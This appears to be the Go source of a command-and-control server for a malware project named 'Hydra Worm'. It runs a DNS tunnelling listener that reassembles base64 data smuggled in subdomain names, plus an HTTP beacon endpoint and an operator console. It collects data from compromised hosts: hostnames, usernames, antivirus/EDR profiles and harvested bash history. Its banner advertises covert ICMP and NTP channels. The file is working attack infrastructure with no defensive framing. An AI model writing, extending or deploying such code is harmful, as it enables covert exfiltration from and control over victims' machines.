package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/chzyer/readline"
	"github.com/gin-gonic/gin"
	"github.com/miekg/dns"
	"github.com/pterm/pterm"
)

// The root domain we are authoritative for
const rootDomain = "c2.hydra-worm.local."

// Telemetry represents the data structure expected from the Rust Agent
// Enhanced to support Sprint 2: Recon Pillars I - VII
type Telemetry struct {
	AgentID   string  `json:"a"`
	Transport string  `json:"t"`
	Status    string  `json:"s"`
	Lambda    float64 `json:"l"`
	Hostname  string  `json:"h"`
	Username  string  `json:"u"`
	OS        string  `json:"o"`
	EnvContext string `json:"e"`
	ArtifactPreview string `json:"p"`
	DefenseProfile string `json:"d"`
}

// RenderVaporBanner displays the header-based banner with the tactical aesthetic
func RenderVaporBanner() {
	fmt.Print("\033[H\033[2J") 

	pterm.NewStyle(pterm.FgCyan, pterm.Bold).Println(`
           / /_  __  ______  __/ /__________ _   
          / __ \/ / / / __ \/ __  / ___/ __ ` + "`" + `   
         / / / / /_/ / /_/ / /_/ / /  / /_/ /    
        /_/ /_/\__, / .___/\__,_/_/   \__,_/     
   _      ____/____/_/___  ____ ___              
  | | /| / / __ \/ __ \/ __ ` + "`" + `__ \                
  | |/ |/ / /_/ / /_/ / / / / / /                
  |__/|__/\____/_/ .__/_/ /_/ /_/                 
                /_/                              
    W O R M  -  O R C H E S T R A T O R`)

	pterm.Println(pterm.Cyan("────────────────────────────────────────────────────────────"))

	// In a full implementation, these statuses would be tied to global health bools
	pterm.DefaultTable.WithData(pterm.TableData{
		{"LISTENER", "PORT", "STATUS", "STRENGTH"},
		{"Cloud API", "443", pterm.LightYellow("STANDBY"), "ELITE"},
		{"Malleable HTTP", "8080", pterm.LightGreen("LISTENING"), "HIGH"},
		{"P2P Gossip", "9090", pterm.LightYellow("STANDBY"), "MESH"},
		{"DNS Tunnel", "53", pterm.LightGreen("LISTENING"), "CRITICAL"},
		{"ICMP Echo", "RAW", pterm.LightYellow("STANDBY"), "FAILSAFE"}, // Corrected to STANDBY until Tier 4 logic is verified
		{"NTP Covert", "123", pterm.LightYellow("STANDBY"), "STEALTH"}, // Corrected to STANDBY
	}).WithBoxed().Render()

	pterm.Printf("\n%s Phase 2.2: Artifact Harvesting & Logic Verification Online.\n\n", pterm.Cyan("»"))
}

// LogHeartbeat provides consistent, colored feedback like VaporTrace
func LogHeartbeat(transport string, t Telemetry) {
	timestamp := time.Now().Format("15:04:05")
	
	// Create the header line with user and environment context
	header := fmt.Sprintf("[%s] %s | ID: %s | USER: %s@%s | ENV: %s",
		pterm.Gray(timestamp),
		pterm.LightCyan(transport),
		pterm.LightWhite(t.AgentID),
		pterm.LightMagenta(t.Username),
		pterm.LightMagenta(t.Hostname),
		pterm.Yellow(t.EnvContext))
		pterm.Printf("      └─ %s %s\n", pterm.LightRed("EDR/AV:"), pterm.Yellow(t.DefenseProfile))
	
	pterm.Println(header)

	// Display the harvested artifact (Bash history snippet)
	if t.ArtifactPreview != "" && t.ArtifactPreview != "Access Denied" {
		pterm.Printf("      └─ %s %s\n", 
			pterm.LightRed("RECON:"), 
			pterm.Italic.Sprint(t.ArtifactPreview))
	}
}

// parseHydraDNS handles incoming DNS Tunneling heartbeats
// parseHydraDNS handles incoming DNS Tunneling heartbeats
func parseHydraDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	for _, q := range r.Question {
		rawName := strings.TrimSuffix(q.Name, ".")
		cleanRoot := strings.TrimSuffix(rootDomain, ".")

		if strings.HasSuffix(strings.ToLower(rawName), strings.ToLower(cleanRoot)) {
			// 1. Extract and Reassemble: Remove dots to rebuild original Base64
			payloadPart := rawName[:len(rawName)-len(cleanRoot)-1]
			encodedPayload := strings.ReplaceAll(payloadPart, ".", "") // STITCHING STEP
			
			// 2. Normalize and Pad
			normalized := strings.ReplaceAll(encodedPayload, "-", "+")
			normalized = strings.ReplaceAll(normalized, "_", "/")
			for len(normalized)%4 != 0 { normalized += "=" }

			// 3. Decode
			decoded, err := base64.StdEncoding.DecodeString(normalized)
			if err != nil {
				decoded, _ = base64.URLEncoding.DecodeString(normalized)
			}

			// 4. Log and Acknowledge
			if decoded != nil {
				var t Telemetry
				if err := json.Unmarshal(decoded, &t); err == nil {
					LogHeartbeat("DNS", t) // Feedback returns to the UI
					
					// 5. Send A-Record ACK back to Agent
					rr, _ := dns.NewRR(fmt.Sprintf("%s 60 IN A 127.0.0.1", q.Name))
					msg.Answer = append(msg.Answer, rr)
				}
			}
		}
	}
	w.WriteMsg(msg)
}

func startDNSServer() {
	dns.HandleFunc(rootDomain, parseHydraDNS)
	server := &dns.Server{Addr: ":53", Net: "udp"}
	log.Printf("[+] Starting DNS server on :53")
	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("[-] DNS Server Failed: %v", err)
	}
}

func main() {
	RenderVaporBanner()

	// 1. Start DNS listener in background
	go startDNSServer()

	// 2. Setup HTTP listener (Gin)
	gin.SetMode(gin.ReleaseMode)
	r := gin.New() 
	r.Use(gin.Recovery())

	r.POST("/api/v1/heartbeat", func(c *gin.Context) {
		var hb Telemetry
		if err := c.ShouldBindJSON(&hb); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid telemetry"})
			return
		}

		LogHeartbeat("HTTP", hb)

		c.JSON(http.StatusOK, gin.H{
			"status": "acknowledged", 
			"task": "SLEEP", 
			"epoch": time.Now().Unix(),
		})
	})

	go func() {
		log.Printf("[+] Starting HTTP server on :8080")
		if err := r.Run(":8080"); err != nil {
			log.Fatalf("[-] HTTP Server Failed: %v", err)
		}
	}()

	// Metadata logs for additional listeners added for Sprint 1.6
	log.Printf("[*] P2P Gossip Mesh listener initialized on :9090 (STANDBY)")
	log.Printf("[*] Cloud API Relay listener initialized on :443 (STANDBY)")

	// 3. Start Interactive Tactical Shell with Auto-Completion
	completer := readline.NewPrefixCompleter(
		readline.PcItem("agents"),
		readline.PcItem("tasks"),
		readline.PcItem("clear"),
		readline.PcItem("help"),
		readline.PcItem("exit"),
	)

	// Correct style instantiation for the prompt
	statusLabel := pterm.NewStyle(pterm.FgGreen, pterm.Bold).Sprint("ONLINE")
	userHostLabel := pterm.NewStyle(pterm.FgCyan, pterm.Bold).Sprint("hydra@orchestrator")
	promptArrow := pterm.NewStyle(pterm.FgBlue, pterm.Bold).Sprint("~$ ")

	prompt := fmt.Sprintf("[%s] %s%s%s ",
		statusLabel,
		userHostLabel,
		pterm.White(":"),
		promptArrow,
	)

	rl, err := readline.NewEx(&readline.Config{
		Prompt:          prompt,
		HistoryFile:      "/tmp/hydra.tmp",
		AutoComplete:     completer,
		InterruptPrompt: "^C",
		EOFPrompt:        "exit",
	})
	if err != nil {
		log.Fatalf("[-] Failed to initialize shell: %v", err)
	}
	defer rl.Close()

	for {
		line, err := rl.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		switch line {
		case "agents":
			pterm.DefaultSection.Println("Active Hydra Agents")
		case "clear", "cls":
			RenderVaporBanner()
		case "help":
			pterm.Info.Println("Available Commands:")
			pterm.BulletListPrinter{Items: []pterm.BulletListItem{
				{Level: 0, Text: "agents : List all beaconing entities"},
				{Level: 0, Text: "tasks  : View queued mission objectives"},
				{Level: 0, Text: "clear  : Refresh tactical display"},
				{Level: 0, Text: "exit   : Terminate orchestrator session"},
			}}.Render()
		case "exit":
			result, _ := pterm.DefaultInteractiveConfirm.
				WithDefaultText("Terminate mission and exit orchestrator?").
				WithConfirmStyle(pterm.NewStyle(pterm.FgRed, pterm.Bold)).
				Show()
			if result {
				pterm.Info.Println("Orchestrator shutting down.")
				os.Exit(0)
			}
		default:
			pterm.Error.Printfln("Unknown tactical command: %s", line)
		}
	}
}